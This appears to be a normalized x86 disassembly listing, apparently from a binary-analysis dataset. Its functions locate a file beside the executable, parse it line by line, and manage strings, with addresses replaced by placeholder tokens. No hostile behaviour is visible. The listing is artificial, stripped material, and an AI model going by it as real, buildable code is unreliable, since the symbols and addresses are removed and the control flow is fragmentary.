xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx rw-data
call sub_40d0f0
mov eax [ rw-data ]
lea ecx [ ebp - 0x4fc ]
push ecx
mov [ ebp - 0x4fc ] eax
mov eax [ rw-data ]
push 0x10
push eax
mov [ rw-data ] eax
lea eax [ ebp - 0x500 ]
push eax
mov ecx rw-data
call sub_40ddf0
lea eax [ ebp - 0x440 ]
push eax
mov [ rw-data ] 0x7
mov [ rw-data ] 0x8
mov [ rw-data ] 0x0
call sub_411710
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x42c ] 0x8
lea eax [ ebp - 0x440 ]
cmovae eax [ ebp - 0x440 ]
push eax
call [ PathRemoveFileSpecW@IAT ]
cmp [ ebp - 0x42c ] 0x8
lea eax [ ebp - 0x440 ]
cmovae eax [ ebp - 0x440 ]
push r--data
push eax
call [ PathAppendW@IAT ]
push ecx
lea ecx [ ebp - 0x4e8 ]
mov [ ebp - 0x4f8 ] r--data
mov [ ebp - 0x460 ] 0x0
mov [ ebp - 0x45c ] 0x0
mov [ ebp - 0x458 ] 0x0
mov [ ebp - 0x450 ] 0x0
mov [ ebp - 0x44c ] 0x0
call sub_4097b0
sub esp 0xc
lea eax [ ebp - 0x440 ]
push eax
lea ecx [ ebp - 0x4f8 ]
call sub_40ba60
push 0x3ff
lea eax [ ebp - 0x40f ]
push 0x0
mov [ ebp - 0x4 ] 0x1
push eax
mov [ ebp - 0x410 ] 0x0
call sub_41cae0
add esp 0xc
lea ecx [ ebp - 0x428 ]
push 0x0
push r--data
mov [ ebp - 0x414 ] 0xf
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x428 ] 0x0
call sub_401630
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x498 ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp [ ebp - 0x414 ] 0x10
jb r-xdata
mov eax [ ebp - 0x4f8 ]
mov eax [ eax + 0x4 ]
test [ ebp + eax - 0x4ec ] 0x1
jne r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov eax [ rw-data ]
dec eax
mov [ rw-data ] eax
jne r-xdata
push [ esi ]
call j_sub_417912#2
add esp 0x4
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x4f8 ]
mov [ ebp - 0x414 ] 0xf
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x428 ] 0x0
mov eax [ eax + 0x4 ]
mov [ ebp + eax - 0x4f8 ] r--data
mov eax [ ebp - 0x4f8 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x70 ]
mov [ ebp + ecx - 0x4fc ] eax
lea ecx [ ebp - 0x4e8 ]
call sub_40bbf0
mov eax [ ebp - 0x4f8 ]
mov eax [ eax + 0x4 ]
mov [ ebp + eax - 0x4f8 ] r--data
mov eax [ ebp - 0x4f8 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x18 ]
mov [ ebp + ecx - 0x4fc ] eax
lea eax [ ebp - 0x488 ]
push eax
mov [ ebp - 0x488 ] r--data
call sub_416ed8
add esp 0x4
cmp [ ebp - 0x42c ] 0x8
jb r-xdata
push [ ebp - 0x428 ]
call j_sub_417912#2
add esp 0x4
lea ecx [ ebp - 0x4e8 ]
call sub_40d3a0
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
inc edx
xor edx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
push [ ebp - 0x440 ]
call j_sub_417912#2
add esp 0x4
mov eax [ ebp - 0x4f8 ]
lea ecx [ ebp - 0x4f8 ]
mov eax [ eax + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4f8 ]
add ecx eax
lea eax [ ebp - 0x4fc ]
push eax
call sub_408ed0
push eax
mov [ ebp - 0x4 ] 0x3
call sub_40e080
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x4fc ]
add esp 0x4
mov esi eax
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
dec ecx
and ecx edx
mov esi [ eax + ecx * 4 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ rw-data ] edx
test eax eax
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov eax [ esi ]
push 0xa
mov eax [ eax + 0x20 ]
mov ecx esi
call eax
mov [ ebp - 0x504 ] al
push [ ebp - 0x504 ]
lea eax [ ebp - 0x410 ]
sub esp 0x8
lea ecx [ ebp - 0x4f8 ]
push eax
call sub_40cb50
cmp [ ebp - 0x410 ] 0x0
mov [ ebp - 0x508 ] 0xf
mov [ ebp - 0x50c ] 0x0
mov [ ebp - 0x51c ] 0x0
jne r-xdata
mov edx [ ecx ]
call [ edx + 0x8 ]
test eax eax
je r-xdata
push 0x0
call sub_408e40
lea eax [ ebp - 0x410 ]
lea edx [ eax + 0x1 ]
nop
xor eax eax
jmp r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x410 ]
push eax
lea ecx [ ebp - 0x51c ]
call sub_401630
cmp [ ebp - 0x414 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x508 ]
mov [ ebp - 0x414 ] 0xf
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x428 ] 0x0
cmp ecx 0x10
jae r-xdata
push [ ebp - 0x428 ]
call j_sub_417912#2
add esp 0x4
mov eax [ ebp - 0x51c ]
mov [ ebp - 0x428 ] eax
mov eax [ ebp - 0x50c ]
lea edx [ eax + 0x1 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4f8 ]
mov eax [ eax + 0x4 ]
test [ ebp + eax - 0x4ec ] 0x1
je r-xdata
mov esi [ rw-data ]
lea eax [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x500 ]
push eax
call sub_40ceb0
cmp [ ebp - 0x500 ] esi
jne r-xdata
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x414 ] ecx
cmp eax 0x1
jb r-xdata
push edx
lea eax [ ebp - 0x51c ]
push eax
lea eax [ ebp - 0x428 ]
push eax
call sub_4170d0
mov ecx [ ebp - 0x508 ]
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x428 ]
push eax
call sub_40b8d0
mov edx [ rw-data ]
mov [ eax ] 0x1
lea eax [ edx + edx * 2 ]
inc edx
lea ecx [ eax * 8 + rw-data ]
lea eax [ ebp - 0x428 ]
mov [ rw-data ] edx
cmp ecx eax
je r-xdata
mov eax [ ebp - 0x50c ]
push 0xffffffff
push 0x0
push eax
call sub_401500
sub_409750
mov eax [ ecx ]
push esi
mov eax [ eax + 0x4 ]
lea esi [ ecx + 0x70 ]
mov [ eax + esi - 0x70 ] r--data
mov eax [ esi - 0x70 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x70 ]
mov [ ecx + esi - 0x74 ] eax
lea ecx [ esi - 0x60 ]
call sub_40bbf0
mov eax [ esi - 0x70 ]
push esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x70 ] r--data
mov eax [ esi - 0x70 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + esi - 0x74 ] eax
mov [ esi ] r--data
call sub_416ed8
add esp 0x4
pop esi
retn
sub_4097b0
mov [ ecx + 0x4 ] 0x0
mov [ ecx + 0x8 ] 0x0
mov [ ecx + 0xc ] 0x0
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x18 ] 0x0
mov [ ecx + 0x1c ] 0x0
mov [ ecx + 0x20 ] 0x0
mov [ ecx + 0x2c ] 0x0
mov [ ecx + 0x30 ] 0x0
mov [ ecx + 0x34 ] 0x0
mov [ ecx + 0x38 ] 0x0
mov [ ecx + 0x3c ] 0x0
mov [ ecx + 0x40 ] 0x0
mov [ ecx + 0x50 ] 0x0
retn 0x4
sub_409820
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_430726
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xe0 ]
mov [ fs : 0x0 ] eax
mov esi ecx
push esi
call sub_40b8d0
mov edx [ rw-data ]
mov [ eax ] 0x1
lea eax [ edx + edx * 2 ]
inc edx
lea ecx [ eax * 8 + rw-data ]
mov [ rw-data ] edx
cmp ecx esi
je r-xdata
lea eax [ esp + 0x14 ]
push eax
call sub_411710
mov [ esp + 0xe8 ] 0x0
cmp [ esp + 0x28 ] 0x8
lea eax [ esp + 0x14 ]
cmovae eax [ esp + 0x14 ]
push eax
call [ PathRemoveFileSpecW@IAT ]
cmp [ esp + 0x28 ] 0x8
lea eax [ esp + 0x14 ]
cmovae eax [ esp + 0x14 ]
push r--data
push eax
call [ PathAppendW@IAT ]
push ecx
lea ecx [ esp + 0x34 ]
mov [ esp + 0x30 ] r--data
mov [ esp + 0xb8 ] 0x0
mov [ esp + 0xbc ] 0x0
mov [ esp + 0xc0 ] 0x0
mov [ esp + 0xc8 ] 0x0
mov [ esp + 0xcc ] 0x0
call sub_4097b0
sub esp 0xc
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x3c ]
call sub_40c460
mov [ esp + 0xe8 ] 0x1
cmp [ esp + 0x80 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
push esi
call sub_401500
mov [ esp + 0xe8 ] 0x0
mov eax [ esp + 0x2c ]
mov eax [ eax + 0x4 ]
mov [ esp + eax + 0x2c ] r--data
mov eax [ esp + 0x2c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x60 ]
mov [ esp + ecx + 0x28 ] eax
cmp [ esp + 0x80 ] 0x0
mov [ esp + 0x30 ] r--data
je r-xdata
xor edi edi
cmp [ rw-data ] edi
jle r-xdata
cmp [ esp + 0x7c ] 0x0
je r-xdata
mov edx [ esp + 0x3c ]
lea eax [ esp + 0x74 ]
cmp [ edx ] eax
jne r-xdata
lea ecx [ esp + 0x30 ]
call sub_40d3a0
test eax eax
jne r-xdata
mov ebx rw-data
mov esi [ esp + 0x64 ]
mov [ esp + 0x30 ] r--data
test esi esi
je r-xdata
lea ecx [ esp + 0x30 ]
call sub_40d3a0
mov eax [ esp + 0x68 ]
mov ecx [ esp + 0x6c ]
mov [ edx ] eax
mov eax [ esp + 0x4c ]
mov [ eax ] ecx
mov eax [ esp + 0x5c ]
sub ecx ecx
mov [ eax ] ecx
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x2c ]
mov eax [ eax + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edx ebx
lea ecx [ esp + 0x2c ]
call sub_40e1b0
mov esi eax
push ecx
mov ecx esi
call sub_40b270
mov ecx esi
call sub_40b3f0
inc edi
add ebx 0x18
cmp edi [ rw-data ]
jl r-xdata
mov eax [ esp + 0x2c ]
mov eax [ eax + 0x4 ]
mov [ esp + eax + 0x2c ] r--data
mov eax [ esp + 0x2c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ esp + ecx + 0x28 ] eax
lea eax [ esp + 0x8c ]
push eax
mov [ esp + 0x90 ] r--data
call sub_416ed8
add esp 0x4
cmp [ esp + 0x28 ] 0x8
jb r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov ecx [ esp + 0xe0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xc8 ]
xor ecx esp
call sub_4170bc
mov esp ebp
pop ebp
retn
push [ esp + 0x14 ]
call j_sub_417912#2
add esp 0x4
push esi
call j_sub_417912#2
add esp 0x4
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
push 0x0
call sub_408e40
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_409ac0
mov eax [ ecx ]
push esi
mov eax [ eax + 0x4 ]
lea esi [ ecx + 0x60 ]
mov [ eax + esi - 0x60 ] r--data
mov eax [ esi - 0x60 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x60 ]
mov [ ecx + esi - 0x64 ] eax
lea ecx [ esi - 0x5c ]
call sub_40bbf0
mov eax [ esi - 0x60 ]
push esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x60 ] r--data
mov eax [ esi - 0x60 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x64 ] eax
mov [ esi ] r--data
call sub_416ed8
add esp 0x4
pop esi
retn
sub_409b20
push ebp
mov ebp esp
push 0xffffffff
push sub_4303e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
call sub_409260
push rw-data
push rw-data
push rw-data
push rw-data
call sub_411f70
push rw-data
lea eax [ ebp - 0x3c ]
push eax
call sub_412c10
push ecx
push eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_410360
mov esi eax
cmp esi rw-data
je r-xdata
cmp [ ebp - 0x10 ] 0x10
jb r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x28 ] 0x8
mov [ ebp - 0x10 ] 0xf
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x24 ] 0x0
jb r-xdata
push [ ebp - 0x24 ]
call j_sub_417912#2
add esp 0x4
push esi
mov ecx rw-data
mov [ rw-data ] 0xf
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call sub_40c7e0
push [ rw-data ]
call j_sub_417912#2
add esp 0x4
lea eax [ ebp - 0x54 ]
push eax
call sub_413820
mov esi eax
cmp esi rw-data
je r-xdata
push [ ebp - 0x3c ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x40 ] 0x8
jb r-xdata
cmp [ rw-data ] 0x8
jb r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push [ ebp - 0x54 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
push esi
mov ecx rw-data
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
call sub_40cd80
push [ rw-data ]
call j_sub_417912#2
add esp 0x4
sub_409c80
push esi
mov esi ecx
cmp [ esi + 0x30 ] 0x10
jb r-xdata
mov [ esi + 0x30 ] 0xf
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] 0x0
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push [ esi + 0x1c ]
call j_sub_417912#2
add esp 0x4
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call j_sub_417912#2
add esp 0x4
sub_409cd0
push ebp
mov ebp esp
push 0xffffffff
push sub_430504
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx edx
mov esi ecx
mov [ ebp - 0xc2c ] esi
mov eax [ ebx + 0x10 ]
push sub_401490
push sub_40b120
push 0x80
mov [ ebp - 0xc50 ] eax
push 0x18
lea eax [ ebp - 0xc10 ]
xor edi edi
push eax
mov [ ebp - 0xc30 ] 0x0
mov [ ebp - 0xc58 ] 0x0
mov [ ebp - 0xc5c ] edi
call sub_4190b3
mov [ ebp - 0x4 ] edi
push edi
push r--data
lea ecx [ ebp - 0xc28 ]
mov [ ebp - 0xc14 ] 0xf
mov [ ebp - 0xc18 ] edi
mov [ ebp - 0xc28 ] 0x0
call sub_401630
xor edx edx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0xc54 ] edx
cmp [ ebp - 0xc50 ] edx
jle r-xdata
mov eax [ ebp - 0xc58 ]
dec eax
mov [ ebp - 0xc50 ] eax
test eax eax
jle r-xdata
lea eax [ ebp - 0xc10 ]
mov [ ebp - 0xc60 ] eax
lea esp [ esp ]
cmp [ ebp - 0xc14 ] 0x10
jb r-xdata
lea ebx [ esi + 0x1c ]
lea edi [ ebp - 0xc10 ]
add esi 0x4
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
push sub_401490
push 0x80
push 0x18
lea eax [ ebp - 0xc10 ]
push eax
mov [ ebp - 0xc14 ] 0xf
mov [ ebp - 0xc18 ] 0x0
mov [ ebp - 0xc28 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
call sub_41911b
mov eax [ ebp - 0xc30 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
push [ ebp - 0xc28 ]
call j_sub_417912#2
add esp 0x4
push 0x4
push 0x0
push r--data
mov ecx edi
call sub_40c8f0
cmp eax 0xffffffff
je r-xdata
cmp ecx 0x10
jb r-xdata
inc edi
mov [ ebp - 0xc5c ] edi
cmp edi 0x1
je r-xdata
cmp [ eax + edx ] 0x23
jne r-xdata
push 0x5
push 0x0
push r--data
mov ecx edi
call sub_40c8f0
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0xc2c ]
mov [ eax ] 0x1
mov eax [ edi + 0x10 ]
add eax 0xfffffffc
push eax
push 0x4
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
inc edx
mov [ ebp - 0xc54 ] edx
cmp edx [ ebp - 0xc50 ]
jl r-xdata
mov eax [ ebp - 0xc60 ]
inc [ ebp - 0xc58 ]
mov ecx eax
add eax 0x18
mov [ ebp - 0xc60 ] eax
lea eax [ ebp - 0xc28 ]
cmp ecx eax
je r-xdata
push 0x5
push 0x0
push r--data
mov ecx edi
call sub_40c8f0
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0xc2c ]
mov [ eax ] 0x2
jmp r-xdata
push edi
lea ecx [ ebp - 0xc4c ]
mov [ ebp - 0xc38 ] 0xf
mov [ ebp - 0xc3c ] 0x0
mov [ ebp - 0xc4c ] 0x0
call sub_401500
lea eax [ ebp - 0xc4c ]
cmp esi eax
je r-xdata
push r--data
call sub_41682d
lea edi [ ecx + 0x1 ]
cmp edi 0xfffffffe
ja r-xdata
mov al [ eax + edx ]
mov ecx [ ebp - 0xc18 ]
mov [ ebp - 0xc31 ] al
or eax 0xffffffff
sub eax ecx
cmp eax 0x1
jbe r-xdata
mov ecx [ ebx + 0x14 ]
cmp ecx 0x10
jb r-xdata
push 0x0
push r--data
lea ecx [ ebp - 0xc28 ]
call sub_401630
mov edx [ ebp - 0xc54 ]
jmp r-xdata
push 0xffffffff
push 0x0
push eax
call sub_401500
add edi 0x18
dec [ ebp - 0xc50 ]
jne r-xdata
mov eax [ ebp - 0xc2c ]
mov [ eax ] 0x3
mov eax [ edi + 0x10 ]
add eax 0xfffffffb
push eax
push 0x5
cmp [ ebp - 0xc38 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ ebp - 0xc14 ] edi
jae r-xdata
lea eax [ edi + 0x18 ]
cmp ebx eax
je r-xdata
push [ ebp - 0xc4c ]
call j_sub_417912#2
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov ecx [ ebp - 0xc38 ]
cmp ecx 0x10
jae r-xdata
push [ esi ]
call j_sub_417912#2
add esp 0x4
test edi edi
jne r-xdata
push ecx
push edi
lea ecx [ ebp - 0xc28 ]
call sub_4018d0
mov edx [ ebp - 0xc54 ]
jmp r-xdata
inc [ ebp - 0xc30 ]
add [ ebp - 0xc2c ] 0x34
add esi 0x34
add ebx 0x34
push 0xffffffff
push 0x0
push eax
mov ecx ebx
call sub_401500
mov eax [ ebp - 0xc4c ]
mov [ esi ] eax
mov eax [ ebp - 0xc3c ]
inc eax
je r-xdata
setne al
test al al
je r-xdata
cmp [ ebp - 0xc14 ] 0x10
lea eax [ ebp - 0xc28 ]
cmovae eax [ ebp - 0xc28 ]
mov [ ebp - 0xc18 ] edi
mov [ eax ] 0x0
test edi edi
mov eax [ ebp - 0xc3c ]
mov [ esi + 0x14 ] ecx
mov [ esi + 0x10 ] eax
jmp r-xdata
push eax
lea eax [ ebp - 0xc4c ]
push eax
push esi
call sub_4170d0
mov ecx [ ebp - 0xc38 ]
mov eax [ ebp - 0xc3c ]
mov [ esi + 0x14 ] ecx
add esp 0xc
mov [ esi + 0x10 ] eax
jmp r-xdata
mov edi [ ebp - 0xc5c ]
cmp [ ebp - 0xc14 ] 0x10
mov eax [ ebp - 0xc18 ]
mov dl [ ebp - 0xc31 ]
lea ecx [ ebp - 0xc28 ]
cmovae ecx [ ebp - 0xc28 ]
mov [ ecx + eax ] dl
cmp [ ebp - 0xc14 ] 0x10
mov edx [ ebp - 0xc54 ]
lea eax [ ebp - 0xc28 ]
cmovae eax [ ebp - 0xc28 ]
mov [ ebp - 0xc18 ] edi
mov [ eax + edi ] 0x0
sub_40a100
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
push 0x11
push 0x0
mov edi edx
push r--data
mov [ ebp - 0x8 ] edi
mov esi ecx
call sub_40c8f0
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x10 ]
push ebx
xor ebx ebx
push ebx
push r--data
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_401630
mov edx [ ebp + 0x8 ]
xor edi edi
mov [ edx ] ebx
cmp [ ebp - 0x4 ] ebx
jle r-xdata
pop edi
xor al al
pop esi
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
lea esp [ esp ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
inc ebx
jmp r-xdata
cmp [ ecx + edi ] 0x57
jne r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
inc edi
cmp edi [ ebp - 0x4 ]
jl r-xdata
cmp ebx 0x1
jne r-xdata
cmp ebx 0x2
je r-xdata
cmp [ ecx + edi ] 0x23
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
cmp ebx 0x2
jne r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
movzx eax [ eax + edi ]
mov ecx [ ebp - 0x8 ]
push eax
push 0x1
call sub_40c840
mov edx [ ebp + 0x8 ]
jmp r-xdata
movsx ecx [ eax + edi ]
mov eax [ edx ]
lea eax [ eax + eax * 4 ]
lea eax [ eax - 0x18 ]
lea eax [ ecx + eax * 2 ]
mov [ edx ] eax
sub_40a1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_430600
mov eax [ fs : 0x0 ]
push eax
sub esp 0x120
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0xc0 ] r--data
mov [ ebp - 0xa8 ] 0xf
mov [ ebp - 0xac ] 0x0
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0x4 ] 0x0
push 0xb
push r--data
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] 0x0
call sub_401630
mov [ ebp - 0x4 ] 0x1
push 0x1
push r--data
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
call sub_401630
mov [ ebp - 0x4 ] 0x2
push 0x3c
xor eax eax
push r--data
lea ecx [ ebp - 0x110 ]
mov [ ebp - 0xc8 ] 0x621
mov [ ebp - 0xc1 ] 0x1
mov [ ebp - 0xfc ] 0x7
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] ax
call sub_408240
lea eax [ ebp - 0xc1 ]
push eax
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_40f6d0
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0xfc ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x110 ] ax
lea eax [ ebp - 0xc8 ]
push eax
lea edx [ ebp - 0x58 ]
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0xfc ] 0x7
mov [ ebp - 0x100 ] 0x0
call sub_40a100
add esp 0x4
test al al
je r-xdata
push [ ebp - 0x110 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x2c ] 0x10
lea ecx [ ebp - 0x40 ]
cmovae ecx [ ebp - 0x40 ]
push 0x0
mov edx r--data
call sub_408880
add esp 0x4
test eax eax
jne r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0x70 ]
call sub_401630
jmp r-xdata
sete al
test al al
je r-xdata
cmp [ ebp - 0x30 ] eax
setne al
test eax eax
push ecx
push rw-data
lea eax [ ebp - 0xe0 ]
push eax
call sub_410360
mov esi eax
push r--data
mov edx rw-data
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0x9
call sub_40e4f0
add esp 0x4
push esi
mov edx eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0xa
call sub_40e5e0
add esp 0x4
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
lea eax [ ebp - 0x40 ]
push eax
mov ecx edi
call sub_40b140
push r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0xc1 ] 0x1
call sub_407fa0
lea eax [ ebp - 0xc1 ]
push eax
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0xf8 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_40f6d0
mov esi eax
lea eax [ ebp - 0x40 ]
cmp eax esi
je r-xdata
mov [ ebp - 0xe4 ] 0xf
mov [ ebp - 0xe8 ] 0x0
mov [ ebp - 0xf8 ] 0x0
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0xcc ] 0x10
jb r-xdata
push [ ebp - 0xf8 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x5c ] 0x10
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0xf
jb r-xdata
push [ ebp - 0x40 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0xcc ] 0xf
mov [ ebp - 0xd0 ] 0x0
mov [ ebp - 0xe0 ] 0x0
mov [ ebp - 0x74 ] 0xf
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x88 ] 0x0
call sub_401630
mov [ ebp - 0x4 ] 0xe
cmp [ rw-data ] 0x0
je r-xdata
push [ ebp - 0xe0 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x5c ] 0xf
jb r-xdata
push [ ebp - 0x70 ]
call j_sub_417912#2
add esp 0x4
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0xcc ] 0x8
mov [ ebp - 0xe4 ] 0xf
mov [ ebp - 0xe8 ] 0x0
mov [ ebp - 0xf8 ] 0x0
jb r-xdata
push [ ebp - 0xf8 ]
call j_sub_417912#2
add esp 0x4
push esi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
call sub_40c7e0
push [ ebp - 0x40 ]
call j_sub_417912#2
add esp 0x4
push r--data
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x128 ]
call sub_40e4f0
add esp 0x4
lea ecx [ ebp - 0x88 ]
push ecx
mov edx eax
lea ecx [ ebp - 0x110 ]
mov [ ebp - 0x4 ] 0xf
call sub_40e690
mov edx eax
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0x10
call sub_40e710
add esp 0x4
lea ecx [ ebp - 0x70 ]
push ecx
mov edx eax
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] 0x11
call sub_40e690
mov esi eax
lea eax [ ebp - 0x28 ]
add esp 0x4
cmp eax esi
je r-xdata
lea eax [ ebp - 0x104 ]
push eax
mov ecx rw-data
call sub_40db40
mov edx eax
mov eax [ edx ]
test eax eax
je r-xdata
